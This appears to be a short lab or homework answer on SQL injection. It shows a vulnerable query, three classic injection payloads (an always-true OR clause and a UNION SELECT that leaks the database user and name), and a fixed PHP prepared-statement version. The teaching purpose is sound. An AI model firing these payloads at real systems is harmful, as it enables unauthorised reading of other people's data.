Q1 — SQL Injection
Vulnerable Query
SELECT first_name, last_name
FROM users
WHERE user_id = '$id';
________________________________________
Injection Payload
1' OR '1'='1' --
________________________________________
How It Works
Original query:
SELECT * FROM users WHERE user_id='1';
Injected query becomes:
SELECT * FROM users
WHERE user_id='1'
OR '1'='1';
Since:
'1'='1'
is always TRUE, all rows are returned.
________________________________________
More Payloads
Database Name
' UNION SELECT user(), database() --
Return All Rows
' OR 1=1 --
________________________________________
Fixed Secure Query (Prepared Statement)
<?php

$stmt = $conn->prepare(
    "SELECT first_name, last_name FROM users WHERE user_id=?"
);

$stmt->bind_param("i", $id);

$stmt->execute();

?>
________________________________________
Why Prepared Statements Work
User input is treated strictly as data, not SQL code.
